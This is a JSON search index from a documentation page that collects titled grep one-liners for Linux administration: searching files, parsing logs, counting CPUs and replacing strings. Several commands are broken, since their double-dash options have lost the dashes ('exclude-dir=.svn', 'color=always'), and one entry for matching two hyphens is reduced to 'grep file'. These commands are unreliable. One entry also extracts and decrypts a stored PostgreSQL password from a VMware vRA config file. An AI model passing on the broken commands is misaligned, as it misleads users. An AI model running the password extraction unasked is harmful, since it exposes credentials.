your_file","title":"grep"},{"location":"linux/grep/#grep","text":"I usually using ripgrep for the same thing as grep, mostly commands works fine with ripgrep too","title":"grep"},{"location":"linux/grep/#print-number-of-cpus-in-a-system","text":"grep -c '^$' /proc/cpuinfo","title":"Print number of CPU's in a system"},{"location":"linux/grep/#grep-for-2-or-more-words-anywhere-on-each-line-of-a-file","text":"grep -E \"(.*)(ERROR)(.*)(FAULT)(.*)\" log.txt","title":"Grep for 2 (or more) words anywhere on each line of a file"},{"location":"linux/grep/#grep-directory-and-sub-directories","text":"grep -r <searchterm> .","title":"Grep directory and sub-directories"},{"location":"linux/grep/#grep-an-array-item-like-a_var11-in-a-file","text":"grep -n \"arrname\\[[[:digit:]]\\+\\]\" filename","title":"Grep an array item, like a_var[11], in a file"},{"location":"linux/grep/#grep-directory-and-sub-directories_1","text":"grep -r <searchterm> .","title":"Grep directory and sub-directories"},{"location":"linux/grep/#regex-to-reliably-search-a-file-for-valid-ip-addresses-and-external-ip-addresses","text":"grep -Eoa \"\\b(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\b\" Filetosearch.txt","title":"Regex to reliably search a file for valid IP addresses (and external IP addresses)"},{"location":"linux/grep/#csv-list-of-infected-urls-detected-by-clamav","text":"grep \"FOUND\" /var/log/squidclamav.log | awk '{print $5\"-\"$2\"-\"$3\",\"$4\",\"$11}' | sed -e 's/\\,http.*url=/\\,/g' | sed -e 's/&/\\,/g' | sed -e 's/source=//g' |sed -e 's/user=//g' | sed -e 's/virus=//g' | sed -e 's/stream\\:+//g' | sed -e 's/\\+FOUND//g'","title":"CSV list of infected URLS detected by ClamAV"},{"location":"linux/grep/#edit-all-files-found-having-a-specific-string-found-by-grep","text":"grep -ir 'foo' * | awk '{print $1}' | sed -e 's/://' | xargs vim","title":"Edit all files found having a specific string found by grep"},{"location":"linux/grep/#edit-all-files-found-having-a-specific-string-found-by-grep_1","text":"grep -ir 'foo' * | awk -F '{print $1}' | xargs vim","title":"Edit all files found having a specific string found by grep"},{"location":"linux/grep/#list-fonts-used-by-an-svg-file","text":"grep 'font-family:[^;]*' <input file.svg> | sed 's/.*font-family:\\([^;]*\\).*/\\1/g' | sort | uniq","title":"List fonts used by an SVG file"},{"location":"linux/grep/#grep-tab-t","text":"grep $'\\t' sample.txt","title":"grep tab (t)"},{"location":"linux/grep/#find-which-service-was-used-by-which-port-number","text":"grep '\\<110/' /etc/services; grep '\\b110/' /etc/services","title":"Find which service was used by which port number"},{"location":"linux/grep/#add-ofxaddons-mentioned-in-source-files-into-addonsmake","text":"grep -hor ofx[a-zA-Z]*.h src/ | grep -o ofx[^\\.]* >> addons.make","title":"Add ofxAddons mentioned in source files, into addons.make"},{"location":"linux/grep/#finding-cr-lf-files-aka-dos-files-with-m-characters","text":"grep -UIlr \"^M\" *","title":"finding cr-lf files aka dos files with ^M characters"},{"location":"linux/grep/#search-for-specific-ips-taken-form-a-text-file-within-the-apache-access-log","text":"grep -E \":(`cat bnd-ips.txt | sed 's/\\./\\\\./g' | tr '\\n' '|'`)\" access.log","title":"Search for specific IPs taken form a text file within the apache access log"},{"location":"linux/grep/#recursively-grep-thorugh-directory-for-string-in-file","text":"grep -r -i \"phrase\" directory/","title":"Recursively grep thorugh directory for string in file."},{"location":"linux/grep/#list-your-installed-firefox-extensions","text":"grep -hIr -m 1 :name ~/.mozilla/firefox/*.$USER/extensions | tr '<>=' '\"\"\"' | cut -f3 -d'\"' | sort -u","title":"List your installed Firefox extensions"},{"location":"linux/grep/#remove-blank-lines-from-a-file","text":"grep -v \"^$\" file","title":"Remove blank lines from a file"},{"location":"linux/grep/#find-the-device-when-you-only-know-the-mount-point","text":"grep -w /media/KINGSTON /proc/mounts | cut -d \" \" -f","title":"find the device when you only know the mount point"},{"location":"linux/grep/#exclude-svn-directories-with-grep","text":"grep -r exclude-dir=.svn PATTERN PATH","title":"Exclude svn directories with grep"},{"location":"linux/grep/#grep-recursively-through-single-file-extension","text":"grep include=*.py -lir \"delete\" .","title":"Grep Recursively Through Single File Extension"},{"location":"linux/grep/#find-php-files-even-without-extension","text":"grep -Ilr \"<?php\" .","title":"find php files even without extension"},{"location":"linux/grep/#convert-chrome-html-export-to-folders-links-and-descriptions","text":"grep -E '<DT><A|<DT><H3' bookmarks.html | sed 's/<DT>//' | sed '/Bookmarks bar/d' | sed 's/ ADD_DATE=\\\".*\\\"//g' | sed 's/^[ \\t]*//' | tr '<A HREF' '<a href'","title":"convert chrome html export to folders, links and descriptions"},{"location":"linux/grep/#do-an-or-search-using-grep-to-look-for-more-than-one-search-term","text":"grep -i '<searchTerm>\\|<someOtherSearchTerm>' <someFileName>","title":"Do an OR search using grep to look for more than one search term"},{"location":"linux/grep/#show-all-todos-and-a-few-relative-lines-after-it","text":"grep -rnA 10 TODO *","title":"Show all TODOs and a few relative lines after it."},{"location":"linux/grep/#grep-for-a-tab","text":"grep $'\\t' file.txt","title":"Grep for a TAB"},{"location":"linux/grep/#count-emails-in-an-mbox-file","text":"grep -c '^From ' mbox_file","title":"Count emails in an MBOX file"},{"location":"linux/grep/#prints-line-numbers","text":"grep -n . datafile ;","title":"prints line numbers"},{"location":"linux/grep/#grep-for-text-within-all-files-in-a-folder-structure","text":"grep color -R \"text\" directory/","title":"Grep for text within all files in a folder structure"},{"location":"linux/grep/#how-to-get-the-apache-document-root","text":"grep -i '^DocumentRoot' /etc/httpd/conf/httpd.conf | cut -f2 -d'\"'","title":"How To Get the Apache Document Root"},{"location":"linux/grep/#find-names-of-files-ending-in-log-that-have-both-foo-and-bar","text":"grep -l bar *.log | xargs grep -l foo","title":"find names of files ending in *log that have both foo and bar"},{"location":"linux/grep/#multiple-open-files-and-go-directly-to-the-line-where-some-string-is","text":"grep -rl string_to_find public_html/css/ | xargs -I '{}' vim +/string_to_find {} -c \":s/string_to_find/string_replaced\"","title":"Multiple open files and go directly to the line where some string is"},{"location":"linux/grep/#change-the-all-files-which-contains-xxxxx-to-yyyyyy","text":"grep -r -l xxxxx . | xargs perl -i -pe \"s/xxxxx/yyyyy/g\"","title":"change the all files which contains xxxxx to yyyyyy"},{"location":"linux/grep/#search-for-a-string-in-all-files-recursively","text":"grep string * -R","title":"Search for a string in all files recursively"},{"location":"linux/grep/#analyse-a-php-file-for-instantations-and-static-calls","text":"grep -o \"\\(new \\(\\w\\+\\)\\|\\w\\+::\\)\" file.php | sed 's/new \\|:://' | sort | uniq -c | sort","title":"Analyse a PHP file for instantations and static calls"},{"location":"linux/grep/#find-a-word-in-multiple-files-avoiding-svn","text":"grep -r 'keyword keyword2' your/path/ | grep -v svn","title":"find a word in multiple files avoiding svn"},{"location":"linux/grep/#determine-if-cpu-is-32-bit-or-64-bit","text":"grep lm /proc/cpuinfo","title":"determine if CPU is 32-bit or 64-bit"},{"location":"linux/grep/#count-how-many-times-a-string-appears-in-a-source-code-tree","text":"grep -rc logged_in app/ | cut -d : -f 2 | awk '{sum+=$1} END {print sum}'","title":"count how many times a string appears in a (source code) tree"},{"location":"linux/grep/#edit-files-in-current-and-subdir-remove-all-lines-that-containing-certain-string","text":"grep -r \"sampleString\" . |uniq | cut -d: -f1 | xargs sed -i \"/sampleString/d\"","title":"edit files in current and subdir, remove all lines that containing certain string"},{"location":"linux/grep/#remove-todays-debian-installed-packages","text":"grep -e `date +%Y-%m-%d` /var/log/dpkg.log | awk '/install / {print $4}' | uniq | xargs apt-get -y remove","title":"Remove today's Debian installed packages"},{"location":"linux/grep/#list-your-installed-firefox-extensions_1","text":"grep -hIr :name ~/.mozilla/firefox/*.default/extensions | tr '<>=' '\"\"\"' | cut -f3 -d'\"' | sort -u","title":"List your installed Firefox extensions"},{"location":"linux/grep/#get-the-password-for-postgresql-backend-db-for-vmware--vra","text":"grep -i s2enc /etc/vcac/server.xml | sed -e 's/.* password=\\\"\\([^\\\"]*\\)\\\".*/\\1/' | xargs -n 1 vcac-config prop-util -d p 2>/dev/null; echo","title":"Get the password for PostgreSQL backend db for VMware  vRA"},{"location":"linux/grep/#show-a-config-file-without-comments","text":"grep -Pv '^\\S*(#|$)'","title":"Show a config file without comments"},{"location":"linux/grep/#read-nth-column-eg-2nd-column-of-a-row-of-data-in-a-file-that-has-a-specific-word-eg-home-on-that-row-and-extract-the-last-delimited-value-for-the-specified-delimiter-eg-","text":"grep 'HOME.*' data.txt | awk '{print $2}' | awk '{FS=\"/\"}{print $NF}' OR USE ALTERNATE WAY awk '/HOME/ {print $2}' data.txt | awk -F'/' '{print $NF}'","title":"Read Nth column (e.g. 2nd column) of a row of data in a file that has a specific word (e.g. HOME) on that row and extract the last delimited value for the specified delimiter (e.g. /)"},{"location":"linux/grep/#remove-exact-phrase-from-multiple-files","text":"grep -r \"mystring\" . |uniq | cut -d: -f1 | xargs sed -i \"s/mystring//\"","title":"remove exact phrase from multiple files"},{"location":"linux/grep/#execute-a-command-if-a-file-exists","text":"grep -sq \"\" /etc/lsb-release && lsb_release -rd","title":"Execute a command if a file exists"},{"location":"linux/grep/#find-files-containing-text","text":"grep -H -r \"string\" ./* >> grep.txt","title":"find files containing text"},{"location":"linux/grep/#extract-a-certain-number-of-lines-from-a-file-and-dump-them-to-another-file","text":"grep '' -m X file1 > file2","title":"extract a certain number of lines from a file and dump them to another file"},{"location":"linux/grep/#find-the-files-that-include-a-todo-statement-within-a-project","text":"grep exclude-dir=.svn exclude=*~ -i \"TODO\" -rl .","title":"Find the files that include a TODO statement within a project"},{"location":"linux/grep/#grep-hoge----argument-list-too-long","text":"grep -r hoge .","title":"grep 'hoge' */  =&gt; Argument list too long"},{"location":"linux/grep/#rgrep-recursive-grep-without-svn","text":"grep query -r . exclude-dir=.svn","title":"rgrep: recursive grep without .svn"},{"location":"linux/grep/#find-files-containing-text_1","text":"grep -lir \"text to find\" *","title":"Find files containing \"text\""},{"location":"linux/grep/#find-out-how-much-data-is-waiting-to-be-written-to-disk","text":"grep ^Dirty /proc/meminfo","title":"Find out how much data is waiting to be written to disk"},{"location":"linux/grep/#find-string","text":"grep -iR find_me ./","title":"Find String"},{"location":"linux/grep/#view-only-non-comment-non-empty-lines-in-a-configuration-file","text":"grep '^[^#]' squid.conf","title":"View only non-comment non-empty lines in a configuration file"},{"location":"linux/grep/#print-the-matched-line-along-with-the-3-lines-after-it","text":"grep -A 3 -i \"example\" demo_text","title":"Print the matched line, along with the 3 lines after it."},{"location":"linux/grep/#grep-binary-hexadecimal-patterns","text":"grep -P \"\\x05\\x00\\xc0\" mybinaryfile","title":"grep binary (hexadecimal) patterns"},{"location":"linux/grep/#find-the-difference-in-2-files-with-grep-diff-alternative","text":"grep -vf file1 file2","title":"find the difference in 2 files with grep (diff alternative)"},{"location":"linux/grep/#remove-comment--in-conf-files","text":"grep -v ^# file.conf | grep -v ^$ > new_file.conf","title":"remove comment '#' in conf files."},{"location":"linux/grep/#grep-directory-and-sub-directories_2","text":"grep -r <searchterm> *","title":"grep directory and sub-directories"},{"location":"linux/grep/#remove-newlines-from-output","text":"grep . filename","title":"Remove newlines from output"},{"location":"linux/grep/#grep-syslog-today-last-hour","text":"grep -i \"$(date +%b\\ %d\\ %H)\" syslog","title":"Grep syslog today last hour"},{"location":"linux/grep/#grep-log-between-range-of-minutes","text":"grep -i \"$(date +%b\" \"%d )13:4[0-5]\" syslog","title":"Grep log between range of minutes"},{"location":"linux/grep/#colorized-grep-in-less","text":"grep color=always | less -R","title":"Colorized grep in less"},{"location":"linux/grep/#remove-blank-lines-from-a-file-using-grep-and-save-output-to-new-file","text":"grep . filename > newfilename","title":"Remove blank lines from a file using grep and save output to new file"},{"location":"linux/grep/#get-all-possible-problems-from-any-log-files","text":"grep -2 -iIr \"err\\|warn\\|fail\\|crit\" /var/log/*","title":"Get all possible problems from any log files"},{"location":"linux/grep/#intersection-between-two-files","text":"grep -Fx -f file1 file2","title":"intersection between two files"},{"location":"linux/grep/#count-occurrences-per-minute-in-a-log-file","text":"grep <something> logfile | cut -c2-18 | uniq -c","title":"Count occurrences per minute in a log file"},{"location":"linux/grep/#search-and-replace-across-multiple-files","text":"grep -lr -e '<oldword>' * | xargs sed -i 's/<oldword>/<newword>/g'","title":"Search and Replace across multiple files"},{"location":"linux/grep/#quick-keyvalue-display-within-proc-or-sys","text":"grep -r . /sys/class/net/eth0/statistics","title":"Quick key/value display within /proc or /sys"},{"location":"linux/grep/#remove-todays-installed-packages","text":"grep \"install \" /var/log/dpkg.log | awk '{print $4}' | xargs apt-get -y remove purge","title":"Remove today's installed packages"},{"location":"linux/grep/#print-number-of-mb-of-free-ram","text":"grep '^MemFree:' /proc/meminfo | awk '{ mem=($2)/(1024) ; printf \"%0.0f MB\\n\", mem }'","title":"Print number of mb of free ram"},{"location":"linux/grep/#number-of-cpus-in-a-system","text":"grep \"processor\" /proc/cpuinfo | wc -l","title":"Number of CPU's in a system"},{"location":"linux/grep/#recursive-search-and-replace-old-with-new-string-inside-files","text":"grep -rl oldstring . | parallel sed -i -e 's/oldstring/newstring/'","title":"recursive search and replace old with new string, inside files"},{"location":"linux/grep/#delete-files-containing-matching-text","text":"grep -r -Z -l \"<text>\" . | xargs -0 echo rm","title":"delete files containing matching text"},{"location":"linux/grep/#grep-apache-accesslog-and-list-ips-by-hits-and-date---sorted","text":"grep Mar/2009 /var/log/apache2/access.log | awk '{ print $1 }' | sort -n | uniq -c | sort -rn | head","title":"grep apache access.log and list IP's by hits and date - sorted"},{"location":"linux/grep/#find-files-containing-text_2","text":"grep -lir \"some text\" *","title":"find files containing text"},{"location":"linux/grep/#recover-a-deleted-file","text":"grep -a -B 25 -A 100 'some string in the file' /dev/sda1 > results.txt","title":"Recover a deleted file"},{"location":"linux/grep/#embed-referred-images-in-html-files","text":"grep -ioE \"(url\\(|src=)['\\\"]?[^)'\\\"]*\" a.html | grep -ioE \"[^\\\"'(]*.(jpg|png|gif)\" | while read l ; do sed -i \"s>$l>data:image/${l/[^.]*./};base64,`openssl enc -base64 -in $l| tr -d '\\n'`>\" a.html ; done;","title":"embed referred images in HTML files"},{"location":"linux/grep/#remove-comments-and-empty-lines-from-a-conf-file","text":"grep ^[^#] /etc/file.conf","title":"Remove comments and empty lines from a conf file"},{"location":"linux/grep/#replace-all-tabs-with-spaces-in-an-application","text":"grep -PL \"\\t\" -r . | grep -v \".svn\" | xargs sed -i 's/\\t/ /g'","title":"Replace all tabs with spaces in an application"},{"location":"linux/grep/#finding-the-number-of-cpus","text":"grep -c -e '^cpu[0-9]\\+' /proc/stat","title":"Finding the number of cpu's"},{"location":"linux/grep/#extract-email-adresses-from-some-file-or-any-other-pattern","text":"grep -Eio '([[:alnum:]_.]+@[[:alnum:]_]+?\\.[[:alpha:].]{2,6})' file.html","title":"extract email adresses from some file (or any other pattern)"},{"location":"linux/grep/#grep-for-tabs-without-using-ctrl-v-trick","text":"grep -P '\\t' filename","title":"grep for tabs without using Ctrl-V trick"},{"location":"linux/grep/#list-the-cpu-model-name","text":"grep \"model name\" /proc/cpuinfo","title":"List the CPU model name"},{"location":"linux/grep/#cat-a-bunch-of-small-files-with-file-indication","text":"grep . *","title":"cat a bunch of small files with file indication"},{"location":"linux/grep/#edit-all-files-found-having-a-specific-string-found-by-grep_2","text":"grep -Hrli 'foo' * | xargs vim","title":"Edit all files found having a specific string found by grep"},{"location":"linux/grep/#search-for-a--string-inside-all-files-in-the-current-directory","text":"grep -r <pattern> * .[!.]*","title":"Search for a  string inside all files in the current directory"},{"location":"linux/grep/#search-for-a-string-in-all-files-recursively_1","text":"grep -ir string *","title":"Search for a string in all files recursively"},{"location":"linux/grep/#find-common-groups-between-two-users","text":"grep -xFf <(groups user1|cut -f3- -d\\ |sed 's/ /\\n/g') <(groups user2|cut -f3- -d\\ |sed 's/ /\\n/g')","title":"Find common groups between two users"},{"location":"linux/grep/#regenerate-the-etcmtab-file","text":"grep -v rootfs /proc/mounts > /etc/mtab","title":"Regenerate the /etc/mtab file"},{"location":"linux/grep/#search-files-with-js-declarations-inside","text":"grep -r \"<script\" | grep -v src | awk -F: '{print $1}' | uniq","title":"Search files with js declarations inside"},{"location":"linux/grep/#extract-ipv4-addressess-from-file","text":"grep -Eo \\([0-9]\\{1,3\\}[\\.]\\)\\{3\\}[0-9] file | sort | uniq","title":"Extract IPv4 addressess from file"},{"location":"linux/grep/#grep--v-with-multiple-patterns","text":"grep test somefile | grep -v -e error -e critical -e warning","title":"grep -v with multiple patterns."},{"location":"linux/grep/#search-some-text-from-all-files-inside-a-directory","text":"grep -Hrn \"text\" .","title":"Search some text from all files inside a directory"},{"location":"linux/grep/#recursively-grep-thorugh-directory-for-string-in-file_1","text":"grep -rni string dir","title":"Recursively grep thorugh directory for string in file."},{"location":"linux/grep/#output-files-without-comments-or-empty-lines","text":"grep -v \"^\\($\\|#\\)\" <filenames>","title":"Output files without comments or empty lines"},{"location":"linux/grep/#search-through-files-ignoring-svn","text":"grep <pattern> -R . exclude-dir='.svn'","title":"Search through files, ignoring .svn"},{"location":"linux/grep/#grep-lines-containing-two-consecutive-hyphens","text":"grep file","title":"grep lines containing two consecutive hyphens"},{"location":"linux/grep/#check-if-hardware-is-32bit-or-64bit","text":"grep -q '\\<lm\\>' /proc/cpuinfo && echo 64 bits || echo 32 bits","title":"Check if hardware is 32bit or 64bit"},{"location":"linux/grep/#lists-unambigously-names-of-all-xml-elements-used-in-files-in-current-directory","text":"grep -h -o '<[^/!?][^ >]*' * | sort -u | cut -c2-","title":"Lists unambigously names of all xml elements used in files in current directory"},{"location":"linux/grep/#remove-text-from-file1-which-is-in-file2-and-stores-it-in-an-other-file","text":"grep -Fvf file1 file2 > file-new","title":"Remove text from file1 which is in file2 and stores it in an other file"},{"location":"linux/grep/#extract-all-404-errors-from-your-apache-accesslog-prefix-lines-by-occurrences-number","text":"grep \"HTTP/1.1\\\" 404\" access_log | awk '{print $7 } ' | sort | uniq -c | sort -n","title":"Extract all 404 errors from your apache accesslog (prefix lines by occurrences number)"},{"location":"linux/grep/#search-trought-pidgins-conversation-logs-for-searchterm-and-output-the-result","text":"grep -Ri searchterm ~/.purple/logs/* | sed -e 's/<.*?>//g'","title":"Search trought pidgin's conversation logs for \"searchterm\", and output the result."},{"location":"linux/grep/#prints-line-numbers_1","text":"grep -n \"^\" <filename>","title":"Prints line numbers"},{"location":"linux/grep/#display-a-one-liner-of-current-nagios-exit-statuses-great-with-netcatirccat","text":"grep current_state= /var/log/nagios/status.dat|sort|uniq -c|sed -e \"s/[\\t ]*\\([0-9]*\\).*current_state=\\([0-9]*\\)/\\2:\\1/\"|tr \"\\n\" \" \"","title":"display a one-liner of current nagios exit statuses. great with netcat/irccat"},{"location":"linux/grep/#shows-the-torrent-file-name-along-with-the-trackers-url","text":"grep -ao -HP \"http://[^/]*/\" *","title":"Shows the torrent file name along with the trackers url"},{"location":"linux/grep/#grep--v-with-multiple-patterns_1","text":"grep 'test' somefile | grep -vE '(error|critical|warning)'","title":"grep -v with multiple patterns."},{"location":"linux/grep/#read-funny-developer-comments-in-the-linux-source-tree","text":"grep -2riP '\\b(fuck|shit|bitch|tits|ass\\b)' /usr/src/linux/","title":"Read funny developer comments in the Linux source tree"},{"location":"linux/grep/#dump-a-configuration-file-without-comments-or-whitespace","text":"grep -v \"\\ *#\\|^$\" /etc/path/to.config","title":"Dump a configuration file without comments or whitespace..."},{"location":"linux/grep/#find-all-files-containing-a-word","text":"grep -rHi searchphrase *.php","title":"Find all files containing a word"},{"location":"linux/grep/#returns-the-number-of-cores-in-a-linux-machine","text":"grep -c ^processor /proc/cpuinfo","title":"Returns the number of cores in a linux machine."},{"location":"linux/grep/#peak-amount-of-memory-occupied-by-any-process-with-foo-in-its-name","text":"grep VmHWM /proc/$(pgrep -d '/status /proc/' FOO)/status","title":"peak amount of memory occupied by any process with \"FOO\" in its name"},{"location":"linux/grep/#determine-configure-options-used-for-mysql-binary-builds","text":"grep CONFIG $(which mysqlbug)","title":"Determine configure options used for MySQL binary builds"},{"location":"linux/grep/#remove-blank-lines-from-a-file-using-grep-and-save-output-to-new-file_1","text":"grep -v \"^$\" filename > newfilename","title":"Remove blank lines from a file using grep and save output to new file"},{"location":"linux/grep/#makes-a-zenity-select-list-based-on-entries-in-your-wpa_supplicantconf","text":"grep -oE \"ssid=\\\".*\\\"\" /etc/wpa_supplicant.conf | cut -c6- | sed s/\\\"//g | zenity list title=\"Choose Access Point\" column=\"SSID\"","title":"Makes a Zenity select list based on entries in your wpa_supplicant.conf"},{"location":"linux/grep/#strip-config-files-of-comments","text":"grep -vE '^$|^[\\s]*[;#]'","title":"strip config files of comments"},{"location":"linux/grep/#creates-podfeedstxt-a-file-that-lists-the-urls-of-rhythmbox-podcasts-from-the-rhythmdbxml-file","text":"grep -A 5 -e podcast-feed rhythmdb.xml | grep -e \"<location>\" | sed 's: *<!--*[a-t]*-->::g' > PodFeeds.txt","title":"Creates PodFeeds.txt, a file that lists the URLs of rhythmbox podcasts from the rhythmdb.xml file."},{"location":"linux/grep/#sort-and-count-subjects-of-emails-stuck-in-exim-queue","text":"grep -R Subject /var/spool/exim/input/ | sed s/^.*Subject:\\ // | sort | uniq -c | sort -n > ~/email_sort.$(date +%m.%d.%y).txt","title":"Sort and count subjects of emails stuck in Exim queue"},{"location":"linux/grep/#get-debian-package-names-corresponding-to-latex-packages-used-in-a-document","text":"grep -R usepackage * | cut -d']' -f2 | cut -s -d'{' -f 2 | sed s/\"}\"/.sty\"}\"/g | cut -d'}' -f1 | sort | uniq | xargs dpkg -S | cut -d':' -f1 | sort | uniq","title":"Get debian package names corresponding to latex packages used in a document"},{"location":"linux/grep/#recursive-search-and-replace-old-with-new-string-inside-files_1","text":"grep -rlZ oldstring . | xargs -0 sed -i -e 's/oldstring/newstring/'","title":"recursive search and replace old with new string, inside files"},{"location":"linux/grep/#count-lines-in-a-file-with-grep","text":"grep -c \".*\" filename","title":"Count lines in a file with grep"},{"location":"linux/grep/#search-and-replace-in-multiple-files-recursively","text":"grep -lr \"foo\" . | xargs sed -i \"s/foo/bar/g\"","title":"Search and replace in multiple files recursively"},{"location":"linux/grep/#list-last-opened-tabs-in-firefox-browser","text":"grep -Eo '\"entries\":\\[{\"url\":\"[^\"]*\"' \"$HOME/.mozilla/firefox/*.default/sessionstore.js\" | sed 's/^.*:\"//; s/\"$//'","title":"List last opened tabs in firefox browser"},{"location":"linux/grep/#view-all-lines-without-comments","text":"grep -v \"^#\" file.txt | more","title":"view all lines without comments."},{"location":"linux/grep/#list-the-cpu-model-name_1","text":"grep 'model\\|MHz' /proc/cpuinfo |tail -n 2","title":"List the CPU model name"},{"location":"linux/grep/#look-up-a-unicode-character-by-name","text":"grep -i \"$*\" /usr/lib/perl5/Unicode/CharName.pm | while read a b; do /usr/bin/printf \"\\u$a\\tU+%s\\t%s\\n\" \"$b\"; done","title":"Look up a unicode character by name"},{"location":"linux/grep/#count-match-string-lines-from-files","text":"grep -in \"search_string\" /to/your/path","title":"count match string lines from file(s)"},{"location":"linux/grep/#extract-email-adresses-from-some-file-or-any-other-pattern_1","text":"grep -aEio '([[:alnum:]_.-\\+\\-]+@[[:alnum:]_.-]+?\\.[[:alpha:].]{2,6})'","title":"extract email adresses from some file (or any other pattern)"},{"location":"linux/grep/#search-for-a--string-inside-all-files-in-the-current-directory_1","text":"grep -nisI <pattern> * .[!.]*","title":"Search for a  string inside all files in the current directory"},{"location":"linux/grep/#apache-statistics","text":"grep \"10/Sep/2013\" access.log| cut -d[ -f2 | cut -d] -f1 | awk -F: '{print $2\":\"$3}' | sort -nk1 -nk2 | uniq -c | awk '{ if ($1 > 10) print $0}'","title":"apache statistics"},{"location":"linux/grep/#grep-by-paragraph-instead-of-by-line","text":"grepp() { [ $# -eq 1 ] && perl -00ne \"print if /$1/i\" || perl -00ne \"print if /$1/i\" < \"$2\";}","title":"Grep by paragraph instead of by line."},{"location":"linux/grep/#sort-netflow-packet-capture","text":"grep -o -P '[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}\\:[0-9]{1,5}\\s->\\s{5}[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}\\:[0-9]{1,5}' <capture file> | tr -d ' ' | sed 's/:.....//g' | sort -n | uniq -c | sort -nr","title":"Sort netflow packet capture"},{"location":"linux/grep/#check-spell-in-c-source-code","text":"grep -o -h -rE '\".*\"' * | ispell -l -p ~/mydict | sort -u","title":"check spell in c source code"},{"location":"linux/grep/#find-files-containing-text_3","text":"grep -lir \"sometext\" * > sometext_found_in.log","title":"find files containing text"},{"location":"linux/grep/#find-files-beginning-with-filename-that-do-not-include-string","text":"grep -L \"string\" filename*","title":"find files beginning with filename* that do not include \"string\""},{"location":"linux/grep/#number-of-cpus-in-a-system_1","text":"grep -c ^processor /proc/cpuinfo","title":"Number of CPU's in a system"},{"location":"linux/grep/#this-allows-you-to-find-a-string-on-a-set-of-files-recursivly","text":"grep -rF include='*.txt' stringYouLookFor *","title":"This allows you to find a string on a set of files recursivly"},{"location":"linux/grep/#sorted-list-of-dhcp-allocations","text":"grep ^lease /var/lib/dhcp/dhcpd.leases | cut -d ' ' -f 2 | sort -t . -k 1,1n -k 2,2n -k 3,3n -k 4,4n | uniq","title":"sorted list of dhcp allocations"},{"location":"linux/grep/#extract-all-ips-from-a-file","text":"grep -E '([0-9]{1,3})\\.([0-9]{1,3})\\.([0-9]{1,3})\\.([0-9]{1,3})' -o tmp","title":"Extract all IPs from a file"},{"location":"linux/grep/#search-for-string-through-files","text":"grep -Rl \"pattern\" files_or_dir","title":"Search for string through files"},{"location":"linux/grep/#number-of-cpus-in-a-system_2","text":"grep -cE \"^processor\" /proc/cpuinfo","title":"Number of CPU's in a system"},{"location":"linux/grep/#grep-colorized","text":"grep -i color=auto","title":"Grep colorized"},{"location":"linux/grep/#show-lines-that-are-not-commented-out","text":"grep \"^[^#;]\" /etc/php.ini","title":"Show lines that are not commented out"},{"location":"linux/grep/#get-with-grep-exact-x-strings-matches-from-output","text":"grep \"^[A-Za-z0-9]\\{6\\}$\" myfile.txt","title":"get with grep exact x strings matches from output"},{"location":"linux/grep/#check-where-mail-was-sent-from","text":"grep cwd /var/log/exim_mainlog | grep -v /var/spool | awk -F\"cwd=\" '{print $2}' | awk '{print $1}' | sort | uniq -c | sort -n","title":"Check where mail was sent from"},{"location":"linux/grep/#show-a-config-file-without-comments_1","text":"grep -v ^# /etc/somefile.conf | grep .","title":"Show a config file without comments"},{"location":"linux/grep/#search-in-files","text":"grep -i -h 'account.journal.cashbox.line' *.py","title":"Search in files"},{"location":"linux/grep/#cat-a-config-file-removing-all-comments-and-blank-lines","text":"grep -vh '^[[:space:]]*\\(#\\|$\\)' <file>","title":"cat a config file removing all comments and blank lines"},{"location":"linux/grep/#remove-comments-and-empty-lines-from-a-file","text":"grep -v '^#\\|^$' /etc/hdparm.conf","title":"Remove comments and empty lines from a file"},{"location":"linux/grep/#grep-for-word-in-directory-recursive","text":"grep color=auto -iRnH \"$search_word\" $directory","title":"Grep for word in directory (recursive)"},{"location":"linux/grep/#find-all-files-matching-namexml-and-search-for-text-within-them","text":"grep -nH \"text\" -r . include *name.xml","title":"Find all files matching 'name.xml' and search for 'text' within them"},{"location":"linux/grep/#shows-whether-your-cpu-supports-64bit-mode","text":"grep -q ' lm ' /proc/cpuinfo; [ $? -eq 0 ] && echo '64bit supported'","title":"shows whether your CPU supports 64bit mode"},{"location":"linux/grep/#get-the-url-for-the-git-annex-webapp","text":"grep URL ~/annex/.git/annex/webapp.html | tr -d '\">' | awk -F= '{print $4 \"=\" $5}'","title":"Get the URL for the git-annex webapp"},{"location":"linux/grep/#ip-list-of-aborted-mail-logins","text":"grep -i \"aborted login\" /var/log/maillog | awk 'BEGIN{FS=\"=\"}{print substr($4,8)}' | cut -d\",\" -f1","title":"IP list of aborted mail logins"},{"location":"linux/grep/#btrfs-find-file-names-with-checksum-errors","text":"grep \"checksum error at logical\" /var/log/messages | egrep -o \"[^ ]+$\" | tr -d ')' | sort | uniq","title":"Btrfs: Find file names with checksum errors"},{"location":"linux/grep/#grep-for-non-empty-lines-that-do-not-start-with--comments-or--and-does-not-include","text":"grep -v -e '^$' -e '^[#\\[]' -e '\\/' some_file","title":"Grep for non-empty lines that do not start with # (comments) or  and does not include "},{"location":"linux/grep/#find-in-all-files-in-the-current-directory-just-a-find-shorthand","text":"grep -H -n \"pattern\" *","title":"Find in all files in the current directory, just a find shorthand"},{"location":"linux/grep/#grep-lines-containing-two-consecutive-hyphens_1","text":"grep \"\\-\\-\" file","title":"grep lines containing two consecutive hyphens"},{"location":"linux/grep/#get-a-quote-from-pooh","text":"grep -Pooh .*t..r,.* /etc/init.d/*","title":"Get a quote from Pooh"},{"location":"linux/grep/#grep-auth-log-and-print-ip-of-attackers","text":"grep Failed auth.log | rev | cut -d\\ -f4 | rev | sort -u","title":"Grep auth log and print ip of attackers"},{"location":"linux/grep/#calculate-how-many-different-lines-between-two-files","text":"grep -Fvxf $(file1) $(file2) | wc -l","title":"calculate how many different lines between two files"},{"location":"linux/grep/#lists-unambigously-names-of-all-xml-elements-used-in-files-in-current-directory_1","text":"grep -Eho '<[a-ZA-Z_][a-zA-Z0-9_-:]*' * | sort -u | cut -c2-","title":"Lists unambigously names of all xml elements used in files in current directory"},{"location":"linux/grep/#move-linenumbers-of-grep-output-to-end-of-line","text":"grep -n log4j MainPm.java | sed -e 's/^\\([^:]*\\):\\(.*\\)/\\2 \\1/'","title":"move linenumbers of grep output to end 